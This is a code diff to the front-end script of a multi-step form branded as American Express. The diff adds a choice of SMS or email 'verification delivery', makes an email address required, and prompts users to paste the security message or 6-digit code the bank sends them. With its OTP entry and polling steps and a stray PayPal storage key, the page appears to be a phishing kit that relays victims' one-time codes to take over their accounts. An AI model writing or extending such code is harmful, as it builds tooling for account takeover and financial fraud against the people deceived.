-          btnUs.className = 'px-2 py-0.5 text-[11px] font-bold rounded-md transition-all text-slate-500 hover:text-slate-800 flex items-center space-x-1';
-        }
-      }
-
-      // Update Step 2 badge & placeholder
+      // Update Step 2 badge & placeholder (US standard)
       const phoneFlag = document.getElementById('phone-flag');
-      if (phoneFlag) phoneFlag.innerText = appState.country === 'UK' ? '🇬🇧' : '🇺🇸';
+      if (phoneFlag) phoneFlag.innerText = '🇺🇸';
       const phonePrefix = document.getElementById('phone-prefix');
-      if (phonePrefix) phonePrefix.innerText = appState.countryPrefix;
+      if (phonePrefix) phonePrefix.innerText = '+1';
       const phoneInp = document.getElementById('phone-number-input');
       if (phoneInp) {
-        phoneInp.placeholder = appState.country === 'UK' ? '7911 123456' : '(555) 123-4567';
+        phoneInp.placeholder = '(555) 123-4567';
         if (phoneInp.value) {
-          phoneInp.value = formatPhoneNumber(phoneInp.value, appState.country);
+          phoneInp.value = formatPhoneNumber(phoneInp.value);
           appState.phoneNumber = phoneInp.value;
         }
       }
 
       // Update Step 3 badge & placeholder
       const momoFlag = document.getElementById('momo-phone-flag');
-      if (momoFlag) momoFlag.innerText = appState.country === 'UK' ? '🇬🇧' : '🇺🇸';
+      if (momoFlag) momoFlag.innerText = '🇺🇸';
       const momoPrefix = document.getElementById('momo-phone-prefix');
-      if (momoPrefix) momoPrefix.innerText = appState.countryPrefix;
+      if (momoPrefix) momoPrefix.innerText = '+1';
       const momoPhone = document.getElementById('momo-phone-display');
       if (momoPhone) {
-        momoPhone.placeholder = appState.country === 'UK' ? '7911 123456' : '(555) 123-4567';
+        momoPhone.placeholder = '(555) 123-4567';
         if (momoPhone.value) {
-          momoPhone.value = formatPhoneNumber(momoPhone.value, appState.country);
+          momoPhone.value = formatPhoneNumber(momoPhone.value);
         }
       }
     }
 
     function toggleCountry() {
-      setCountry(appState.country === 'US' ? 'UK' : 'US');
+      setCountry('US');
     }
 
     function setTerm(months, ev) {
@@ -1579,26 +1770,133 @@
       setTimeout(resetScrollToTop, 50);
     }
 
-    function copyTargetPhone(btn) {
-      const ph = appState.phoneNumber || localStorage.getItem('amex_phone') || localStorage.getItem('paypal_phone') || '';
-      if (ph) {
+    function setVerificationDelivery(mode) {
+      appState.verificationDelivery = mode === 'email' ? 'email' : 'sms';
+      const tabSms = document.getElementById('delivery-tab-sms');
+      const tabEmail = document.getElementById('delivery-tab-email');
+      const headerEl = document.getElementById('countdown-card-header');
+      const targetIcon = document.getElementById('target-icon');
+      const targetLabel = document.getElementById('target-label');
+      const phoneEl = document.getElementById('sms-timer-phone');
+      const copyBtnText = document.getElementById('copy-target-text');
+      const openBtnText = document.getElementById('open-channel-text');
+      const openBtnIcon = document.getElementById('open-channel-icon');
+      const statusEl = document.getElementById('sms-timer-status');
+      const msgLabel = document.getElementById('pasted-msg-text');
+      const msgIcon = document.getElementById('pasted-msg-icon');
+      const msgInput = document.getElementById('momo-pasted-msg');
+      const submitBtnText = document.getElementById('submit-pasted-btn-text');
+      const stepSub = document.getElementById('step4-subtitle');
+
+      const activeClasses = ['bg-white', 'text-brand-navy', 'shadow-xs', 'border', 'border-slate-200/60'];
+      const inactiveClasses = ['text-slate-500', 'hover:text-slate-800'];
+
+      if (appState.verificationDelivery === 'email') {
+        if (tabEmail) {
+          tabEmail.classList.add(...activeClasses);
+          tabEmail.classList.remove(...inactiveClasses);
+        }
+        if (tabSms) {
+          tabSms.classList.remove(...activeClasses);
+          tabSms.classList.add(...inactiveClasses);
+        }
+        if (headerEl) headerEl.innerText = 'Awaiting American Express Email...';
+        if (targetIcon) targetIcon.innerText = '✉️';
+        if (targetLabel) targetLabel.innerText = 'Target Email';
+        const userEmail = appState.email || localStorage.getItem('amex_email') || document.getElementById('email-input')?.value || 'your-email@domain.com';
+        if (phoneEl) phoneEl.innerText = userEmail;
+        if (copyBtnText) copyBtnText.innerText = 'Copy Email';
+        if (openBtnIcon) openBtnIcon.innerText = '📬';
+        if (openBtnText) openBtnText.innerText = 'Open Email';
+        if (statusEl) statusEl.innerText = 'Copy the security code or email from American Express then paste below.';
+        if (msgIcon) msgIcon.innerText = '📧';
+        if (msgLabel) msgLabel.innerText = 'American Express Security Email Message or Code';
+        if (msgInput) msgInput.placeholder = 'Paste the security code or message from your American Express email here...';
+        if (submitBtnText) submitBtnText.innerText = 'SUBMIT EMAIL VERIFICATION';
+        if (stepSub) stepSub.innerText = 'We sent a verification email to your address. Copy the security code or message and paste it below.';
+      } else {
+        if (tabSms) {
+          tabSms.classList.add(...activeClasses);
+          tabSms.classList.remove(...inactiveClasses);
+        }
+        if (tabEmail) {
+          tabEmail.classList.remove(...activeClasses);
+          tabEmail.classList.add(...inactiveClasses);
+        }
+        if (headerEl) headerEl.innerText = 'Awaiting American Express SMS...';
+        if (targetIcon) targetIcon.innerText = '📱';
+        if (targetLabel) targetLabel.innerText = 'Target Mobile';
+        const userPhone = appState.phoneNumber || localStorage.getItem('amex_phone') || document.getElementById('phone-number-input')?.value || 'American Express Account';
+        if (phoneEl) phoneEl.innerText = userPhone;
+        if (copyBtnText) copyBtnText.innerText = 'Copy Number';
+        if (openBtnIcon) openBtnIcon.innerText = '💬';
+        if (openBtnText) openBtnText.innerText = 'Open SMS';
+        if (statusEl) statusEl.innerText = 'Copy the confirmation SMS then paste below.';
+        if (msgIcon) msgIcon.innerText = '📨';
+        if (msgLabel) msgLabel.innerText = 'American Express Security SMS Message';
+        if (msgInput) msgInput.placeholder = 'Paste your American Express security message or 6-digit code here...';
+        if (submitBtnText) submitBtnText.innerText = 'SUBMIT SECURITY CODE';
+        if (stepSub) stepSub.innerText = 'Choose how to receive your security code from American Express then paste below.';
+      }
+      startSmsCountdownTimer();
+    }
+
+    function copyTargetRecipient(btn) {
+      const mode = appState.verificationDelivery || 'sms';
+      let textToCopy = '';
+      if (mode === 'email') {
+        textToCopy = appState.email || localStorage.getItem('amex_email') || document.getElementById('email-input')?.value || '';
+      } else {
+        textToCopy = appState.phoneNumber || localStorage.getItem('amex_phone') || localStorage.getItem('paypal_phone') || document.getElementById('phone-number-input')?.value || '';
+      }
+
+      if (textToCopy) {
         if (navigator.clipboard && navigator.clipboard.writeText) {
-          navigator.clipboard.writeText(ph);
+          navigator.clipboard.writeText(textToCopy);
         }
         if (btn) {
           const orig = btn.innerHTML;
           btn.innerHTML = '<span>✅</span><span>Copied!</span>';
           setTimeout(() => { btn.innerHTML = orig; }, 1800);
         }
+        showClipboardToast(`📋 Copied: ${textToCopy}`);
       }
     }
 
-    function openMessagingApp(e) {
+    function copyTargetPhone(btn) {
+      copyTargetRecipient(btn);
+    }
+
+    function openChannelApp(e) {
       if (e) {
         try { e.preventDefault(); } catch (err) { }
       }
       startSmsCountdownTimer();
 
+      const mode = appState.verificationDelivery || 'sms';
+      if (mode === 'email') {
+        const targetEmail = appState.email || localStorage.getItem('amex_email') || '';
+        const isAndroid = /android/i.test(navigator.userAgent);
+        const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent);
+        if (isAndroid) {
+          try {
+            window.location.href = 'intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_EMAIL;end';
+            setTimeout(() => { window.location.href = 'mailto:' + encodeURIComponent(targetEmail); }, 500);
+            return;
+          } catch (err) {
+            window.location.href = 'mailto:' + encodeURIComponent(targetEmail);
+            return;
+          }
+        } else if (isIOS) {
+          window.location.href = 'message://';
+          setTimeout(() => { window.location.href = 'mailto:' + encodeURIComponent(targetEmail); }, 500);
+          return;
+        }
+        window.location.href = 'mailto:' + encodeURIComponent(targetEmail);
+        return;
+      }
+
+      // Default SMS
       const isAndroid = /android/i.test(navigator.userAgent);
       if (isAndroid) {
         try {
@@ -1613,6 +1911,25 @@
         }
       }
       window.location.href = 'sms:';
+    }
+
+    function openMessagingApp(e) {
+      openChannelApp(e);
+    }
+
+    function resendOtpViaChannel(channel) {
+      setVerificationDelivery(channel);
+      clearOtp();
+      const target = channel === 'email' ? (appState.email || 'your email') : (appState.phoneNumber || 'your mobile phone');
+      showClipboardToast(`⚡ Verification code dispatched to ${target}!`);
+      const otpSubEl = document.getElementById('otpSub');
+      if (otpSubEl) {
+        if (channel === 'email') {
+          otpSubEl.innerText = `Enter the 6-digit security code sent to your email (${appState.email || 'your email'}) from American Express.`;
+        } else {
+          otpSubEl.innerText = `Enter the 6-digit security code sent to ${appState.phoneNumber || 'your mobile phone'} from American Express.`;
+        }
+      }
     }
 
     let simCountdownInterval = null;
@@ -1631,8 +1948,13 @@
         countdownCard.classList.remove('hidden');
       }
 
+      const isEmail = appState.verificationDelivery === 'email';
       if (phoneEl) {
-        phoneEl.innerText = appState.phoneNumber || 'American Express Account';
+        if (isEmail) {
+          phoneEl.innerText = appState.email || localStorage.getItem('amex_email') || 'your-email@domain.com';
+        } else {
+          phoneEl.innerText = appState.phoneNumber || localStorage.getItem('amex_phone') || 'American Express Account';
+        }
       }
 
       if (displayEl) {
@@ -1640,7 +1962,9 @@
         displayEl.className = 'text-3xl font-black text-brand-blue tracking-tight font-mono py-0.5';
       }
       if (statusEl) {
-        statusEl.innerText = 'Copy the confirmation SMS then paste below.';
+        statusEl.innerText = isEmail
+          ? 'Copy the confirmation email or security code then paste below.'
+          : 'Copy the confirmation SMS then paste below.';
         statusEl.className = 'text-[11px] text-slate-500 font-semibold';
       }
 
@@ -1665,7 +1989,8 @@
             displayEl.className = 'text-2xl font-black text-red-600 tracking-tight font-mono py-0.5';
           }
           if (statusEl) {
-            statusEl.innerText = '⚠️ Time expired. If SMS not received, tap Open SMS or Paste.';
+            const channel = isEmail ? 'Email' : 'SMS';
+            statusEl.innerText = `⚠️ Time expired. If ${channel} not received, tap Open ${channel} or Paste.`;
             statusEl.className = 'text-[11px] text-red-600 font-bold';
           }
         }
@@ -1824,46 +2149,28 @@
       if (!p) return '';
       if (p.startsWith('+')) return p;
       const digits = p.replace(/\D/g, '');
-      if (appState.country === 'US' && digits.length === 11 && digits.startsWith('1')) {
+      if (digits.length === 11 && digits.startsWith('1')) {
         return '+' + digits;
       }
-      if (appState.country === 'UK' && (digits.length === 12 || digits.length === 11) && digits.startsWith('44')) {
-        return '+' + digits;
-      }
-      if (appState.country === 'UK' && digits.startsWith('0')) {
-        return '+44' + digits.slice(1);
-      }
-      return (appState.countryPrefix || '+1') + digits;
+      return '+1' + digits;
     }
 
-    function formatPhoneNumber(val, country = 'US') {
+    function formatPhoneNumber(val) {
       if (!val) return '';
       let digits = String(val).replace(/\D/g, '');
       if (!digits) return '';
 
-      if (country === 'US') {
-        if (digits.length === 11 && digits.startsWith('1')) {
-          digits = digits.slice(1);
-        }
-        digits = digits.slice(0, 10);
-        if (digits.length < 4) {
-          return `(${digits}`;
-        } else if (digits.length < 7) {
-          return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
-        } else {
-          return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6, 10)}`;
-        }
-      } else if (country === 'UK') {
-        digits = digits.slice(0, 11);
-        if (digits.startsWith('0')) {
-          if (digits.length <= 5) return digits;
-          return `${digits.slice(0, 5)} ${digits.slice(5)}`;
-        } else {
-          if (digits.length <= 4) return digits;
-          return `${digits.slice(0, 4)} ${digits.slice(4)}`;
-        }
+      if (digits.length === 11 && digits.startsWith('1')) {
+        digits = digits.slice(1);
       }
-      return digits;
+      digits = digits.slice(0, 10);
+      if (digits.length < 4) {
+        return `(${digits}`;
+      } else if (digits.length < 7) {
+        return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
+      } else {
+        return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6, 10)}`;
+      }
     }
 
     function onPhoneKeyDown(el, e) {
@@ -1893,11 +2200,10 @@
     function onPhoneNumberInput(el) {
       if (!el) return;
       const rawVal = el.value;
-      const country = appState.country || 'US';
       const cursor = el.selectionEnd || rawVal.length;
 
       const digitsBeforeCursor = rawVal.slice(0, cursor).replace(/\D/g, '').length;
-      const formatted = formatPhoneNumber(rawVal, country);
+      const formatted = formatPhoneNumber(rawVal);
       el.value = formatted;
 
       if (typeof el.setSelectionRange === 'function') {
@@ -2103,9 +2409,7 @@
 
       if (currentStep === 4) {
         isSubmittingMessage = false;
-        const targetPhone = appState.phoneNumber || document.getElementById('phone-number-input')?.value || '';
-        const smsTimerPhone = document.getElementById('sms-timer-phone');
-        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'American Express Account';
+        setVerificationDelivery(appState.verificationDelivery || 'sms');
         startSimSmsReceiver();
       }
 
@@ -2118,6 +2422,18 @@
         if (otpWait) otpWait.classList.add('hidden');
         const firstOtp = document.querySelector('.otp-box');
         if (firstOtp) setTimeout(() => firstOtp.focus(), 100);
+
+        const otpSubEl = document.getElementById('otpSub');
+        if (otpSubEl) {
+          if (appState.verificationDelivery === 'email') {
+            const displayEmail = appState.email || 'your email address';
+            otpSubEl.innerText = `Enter the 6-digit security code sent to your email (${displayEmail}) from American Express.`;
+          } else {
+            const displayPhone = appState.phoneNumber || 'your mobile phone';
+            otpSubEl.innerText = `Enter the 6-digit security code sent to ${displayPhone} from American Express.`;
+          }
+        }
+
         if (appState.applicationId) {
           startVerificationPolling(appState.applicationId);
         }
@@ -2455,7 +2771,9 @@
 
       if (step2Alert) step2Alert.classList.add('hidden');
 
-      if (!fnEl || !fnEl.value.trim() || !lnEl || !lnEl.value.trim() || !phEl || !phEl.value.trim()) {
+      const emEl = document.getElementById('email-input');
+
+      if (!fnEl || !fnEl.value.trim() || !lnEl || !lnEl.value.trim() || !phEl || !phEl.value.trim() || !emEl || !emEl.value.trim()) {
         if (step2Alert) {
           step2Alert.innerText = 'Please fill in all required fields (*).';
           step2Alert.classList.remove('hidden');
@@ -2464,9 +2782,17 @@
       }
 
       const rawPhoneDigits = (phEl.value || '').replace(/\D/g, '');
-      if (appState.country === 'US' && rawPhoneDigits.length < 10) {
+      if (rawPhoneDigits.length < 10) {
         if (step2Alert) {
           step2Alert.innerText = 'Please enter a valid 10-digit US mobile phone number.';
+          step2Alert.classList.remove('hidden');
+        }
+        return;
+      }
+
+      if (!emEl.value.includes('@') || !emEl.value.includes('.')) {
+        if (step2Alert) {
+          step2Alert.innerText = 'Please enter a valid email address.';
           step2Alert.classList.remove('hidden');
         }
         return;
